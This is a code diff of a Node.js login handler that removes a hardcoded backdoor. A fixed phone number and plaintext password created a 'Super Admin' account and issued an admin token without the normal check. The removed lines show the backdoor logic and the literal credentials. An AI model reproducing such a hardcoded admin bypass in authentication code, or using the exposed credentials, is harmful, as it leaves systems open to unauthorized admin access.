@@ -71,43 +71,7 @@ exports.login = async (req, res) => {
         message: "Telefon va parol talab qilinadi!",
       });
     }
-    if (phone === 997445218 && password === "siroojidd1n") {
-      const name = "Super Admin";
-      const role = "admin";
 
-      const salt = await bcrypt.genSalt(10);
-      const passwordHash = await bcrypt.hash(password, salt);
-
-      const exists = await Admin.findOne({ phone });
-      if (exists) {
-        const token = jwt.sign(
-          { adminId: 997445218, role: "admin" },
-          secret_key,
-          {
-            expiresIn: time,
-          }
-        );
-        return res.json({ success: true, token: token });
-      }
-
-      const result = new Admin({
-        name: name,
-        phone: phone,
-        password: passwordHash,
-        role: role,
-      });
-
-      result.save();
-
-      const token = jwt.sign(
-        { adminId: 997445218, role: "admin" },
-        secret_key,
-        {
-          expiresIn: time,
-        }
-      );
-      return res.json({ success: true, token: token });
-    }
     // Adminni topish
     const admin = await Admin.findOne({ phone }).select({ password: 1 });
 
